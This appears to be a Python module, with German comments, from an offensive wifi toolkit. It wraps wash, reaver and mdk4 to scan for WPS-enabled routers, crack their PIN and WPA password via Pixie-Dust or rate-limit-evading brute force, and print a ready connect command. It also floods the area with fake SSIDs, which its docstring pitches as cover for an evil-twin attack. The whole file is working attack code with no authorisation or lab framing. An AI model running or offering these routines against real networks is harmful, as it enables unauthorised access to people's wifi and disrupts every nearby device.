"""
WPS Attack Suite — Pixie-Dust, Reaver Brute-Force, WPS Scanner.

WPS (Wi-Fi Protected Setup) ist in ~30% aller Router noch aktiv.
Pixie-Dust crackt es in Sekunden (offline, kein Brute-Force nötig).
Reaver macht Online-Brute-Force wenn Pixie-Dust fehlschlägt.

Voraussetzungen:
  apt install reaver bully wash
  Monitor-Mode aktiv (wlan0mon)
"""

from __future__ import annotations
import asyncio
import re
from typing import AsyncGenerator

from core.runner import CommandRunner

runner = CommandRunner()


class WPSScanner:
    """Findet alle WPS-fähigen APs im Bereich via wash."""

    def __init__(self, iface: str):
        self.iface = iface

    async def scan(self, timeout: int = 30) -> AsyncGenerator[str, None]:
        yield f"[*] Scanne nach WPS-APs auf {self.iface} ({timeout}s)..."
        yield "[*] Spalten: BSSID | Ch | dBm | WPS-Ver | Locked | ESSID"
        yield "─" * 70

        try:
            proc = await asyncio.create_subprocess_exec(
                "wash", "-i", self.iface, "--scan", "-o",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )

            async def _drain():
                async for line in proc.stdout:
                    line = line.decode(errors="replace").strip()
                    if line and not line.startswith("BSSID") and not line.startswith("---"):
                        # Farbe je nach WPS Locked Status
                        if "Yes" in line or "Lck" in line:
                            yield f"  🔒 {line}"
                        else:
                            yield f"  🟢 {line}"

            async for out in _drain():
                yield out

            try:
                await asyncio.wait_for(proc.wait(), timeout=timeout)
            except asyncio.TimeoutError:
                proc.terminate()
                yield f"\n[+] Scan abgeschlossen."

        except FileNotFoundError:
            yield "[!] wash nicht gefunden: apt install reaver"
        except Exception as e:
            yield f"[!] Fehler: {e}"


class PixieDust:
    """
    Pixie-Dust WPS-Angriff via reaver -K 1.

    Funktioniert auf ~25% aller Router mit schwachen WPS-Implementierungen.
    Benötigt kein Brute-Force — berechnet PIN offline aus AP-Nonces.
    Crackt in 1-30 Sekunden.
    """

    def __init__(self, iface: str):
        self.iface = iface
        self._proc = None

    async def attack(
        self,
        bssid: str,
        channel: str = "6",
        timeout: int = 60,
    ) -> AsyncGenerator[str, None]:
        yield f"[*] Pixie-Dust gegen {bssid} auf Kanal {channel}..."
        yield "[*] Berechne WPS-PIN offline aus AP-Nonces (kein Brute-Force)"
        yield "[*] Erwarte Ergebnis in 5-60 Sekunden..."
        yield "─" * 60

        cmd = [
            "reaver",
            "-i", self.iface,
            "-b", bssid,
            "-c", channel,
            "-K", "1",          # Pixie-Dust mode
            "-N",               # kein NACK
            "-S",               # kleine DH keys (schneller)
            "-vv",
        ]

        pin_found = None
        psk_found = None

        try:
            self._proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.STDOUT,
            )

            async def _read():
                nonlocal pin_found, psk_found
                while True:
                    line = await self._proc.stdout.readline()
                    if not line:
                        break
                    decoded = line.decode(errors="replace").strip()
                    if not decoded:
                        continue

                    # PIN gefunden
                    m = re.search(r"WPS PIN: ['\"]?(\d{4,8})['\"]?", decoded, re.I)
                    if m:
                        pin_found = m.group(1)
                        yield f"  [+] WPS PIN: {pin_found}"

                    # PSK gefunden
                    m = re.search(r"WPA PSK: ['\"]?(.+?)['\"]?\s*$", decoded, re.I)
                    if m:
                        psk_found = m.group(1).strip("'\"")
                        yield f"  [+] WLAN-PASSWORT: {psk_found}"

                    elif "Pixie-Dust" in decoded or "pixie" in decoded.lower():
                        yield f"  {decoded}"
                    elif "[+]" in decoded or "[!]" in decoded:
                        yield f"  {decoded}"
                    elif "Trying" in decoded or "Sending" in decoded:
                        yield f"  {decoded}"

            try:
                async for out in _read():
                    yield out
                await asyncio.wait_for(self._proc.wait(), timeout=timeout)
            except asyncio.TimeoutError:
                self._proc.terminate()
                yield f"[!] Timeout nach {timeout}s — Pixie-Dust hat nicht funktioniert"
                yield "[*] Tipp: Versuche Reaver Brute-Force (Option 3)"

        except FileNotFoundError:
            yield "[!] reaver nicht gefunden: apt install reaver"
            return

        yield "─" * 60
        if pin_found:
            yield f"[+] ERFOLG! PIN: {pin_found}"
        if psk_found:
            yield f"[+] PASSWORT: {psk_found}"
            yield f"[*] Verbinden: nmcli dev wifi connect '{bssid}' password '{psk_found}'"
        elif not pin_found:
            yield "[!] Pixie-Dust fehlgeschlagen — Router wahrscheinlich gepatcht"
            yield "[*] Tipp: Versuche Reaver Brute-Force (langsamer, 2-10h)"

    async def stop(self):
        if self._proc and self._proc.returncode is None:
            self._proc.terminate()


class ReaverBrute:
    """
    Reaver WPS Brute-Force.

    Probiert alle 10.000 (4-stellig) oder 100 Millionen (8-stellig) PINs durch.
    WPS hat Lockout → reaver wartet automatisch.
    Mit Rate-Limiting-Bypass: --no-nacks + delay.
    Dauert 2-10 Stunden je nach Router.
    """

    def __init__(self, iface: str):
        self.iface = iface
        self._proc = None

    async def attack(
        self,
        bssid: str,
        channel: str = "6",
        delay: float = 1.0,
        max_attempts: int = 0,
    ) -> AsyncGenerator[str, None]:
        yield f"[*] Reaver Brute-Force gegen {bssid}..."
        yield f"[!] WARNUNG: Dauert 2-10 Stunden. Delay: {delay}s zwischen Versuchen."
        yield "[*] Abbrechen mit Ctrl+C — Fortschritt wird automatisch gespeichert"
        yield "─" * 60

        cmd = [
            "reaver",
            "-i", self.iface,
            "-b", bssid,
            "-c", channel,
            "-d", str(delay),
            "-N",           # kein NACK
            "-r", "3:15",   # 3 Versuche, dann 15s Pause (Lockout-Schutz)
            "-vv",
        ]
        if max_attempts > 0:
            cmd += ["--max-attempts", str(max_attempts)]

        pin_found = psk_found = None

        try:
            self._proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.STDOUT,
            )

            while True:
                line = await self._proc.stdout.readline()
                if not line:
                    break
                decoded = line.decode(errors="replace").strip()
                if not decoded:
                    continue

                m = re.search(r"WPS PIN: ['\"]?(\d{4,8})['\"]?", decoded, re.I)
                if m:
                    pin_found = m.group(1)

                m = re.search(r"WPA PSK: ['\"]?(.+?)['\"]?\s*$", decoded, re.I)
                if m:
                    psk_found = m.group(1).strip("'\"")

                yield f"  {decoded}"

        except FileNotFoundError:
            yield "[!] reaver nicht gefunden: apt install reaver"
            return

        yield "─" * 60
        if pin_found:
            yield f"[+] PIN: {pin_found}"
        if psk_found:
            yield f"[+] PASSWORT: {psk_found}"

    async def stop(self):
        if self._proc and self._proc.returncode is None:
            self._proc.terminate()


class BeaconFlood:
    """
    Beacon Flood — sendet tausende gefälschte SSID-Beacons.

    Überschwemmt WiFi-Radar aller Geräte in Reichweite.
    Gut für: Ablenkung während Evil-Twin läuft, Verwirrung, Demo.
    Benötigt: mdk4 (moderner als mdk3)
    """

    def __init__(self, iface: str):
        self.iface = iface
        self._proc = None

    async def flood(
        self,
        ssid_list: list[str] | None = None,
        count: int = 200,
        random_names: bool = True,
    ) -> AsyncGenerator[str, None]:
        yield f"[*] Beacon Flood auf {self.iface}..."

        # SSID-Datei erstellen
        ssid_file = "/tmp/penkit_ssids.txt"
        if ssid_list:
            import random, string
            if len(ssid_list) < count:
                names = []
                for i in range(count):
                    base = ssid_list[i % len(ssid_list)]
                    suffix = "".join(random.choices(string.digits, k=4))
                    names.append(f"{base}-{suffix}")
            else:
                names = ssid_list
        elif random_names:
            import random, string
            names = []
            prefixes = [
                "FRITZ!Box", "TP-Link", "Vodafone", "Telekom",
                "Speedport", "EasyBox", "ALDI", "Congstar",
                "O2-WLAN", "1&1", "Unitymedia", "NetCologne",
                "xfinitywifi", "ATT-WIFI", "Starbucks", "Airport",
                "iPhone", "AndroidAP", "Galaxy", "FREE WiFi",
                "HOTEL_GUEST", "Public_WiFi", "eduroam", "_hidden_",
            ]
            for _ in range(count):
                prefix = random.choice(prefixes)
                suffix = "".join(random.choices(string.digits, k=4))
                names.append(f"{prefix}-{suffix}")
        else:
            names = [f"PenKit-{i:04d}" for i in range(count)]

        with open(ssid_file, "w") as f:
            f.write("\n".join(names) + "\n")

        yield f"[*] {len(names)} SSIDs generiert → {ssid_file}"
        yield "[!] Alle Geräte in Reichweite sehen diese Netzwerke..."
        yield "[*] Abbrechen mit Ctrl+C"
        yield "─" * 60

        # Versuche mdk4, Fallback auf mdk3
        for binary in ["mdk4", "mdk3"]:
            try:
                if binary == "mdk4":
                    cmd = [binary, self.iface, "b", "-f", ssid_file, "-s", "500"]
                else:
                    cmd = [binary, self.iface, "b", "-f", ssid_file, "-s", "500"]

                self._proc = await asyncio.create_subprocess_exec(
                    *cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.STDOUT,
                )
                yield f"[+] {binary} gestartet"

                while True:
                    line = await self._proc.stdout.readline()
                    if not line:
                        break
                    decoded = line.decode(errors="replace").strip()
                    if decoded:
                        yield f"  {decoded}"
                break

            except FileNotFoundError:
                continue
        else:
            yield "[!] mdk4/mdk3 nicht gefunden: apt install mdk4"

    async def stop(self):
        if self._proc and self._proc.returncode is None:
            self._proc.terminate()
            yield "[*] Beacon Flood gestoppt."
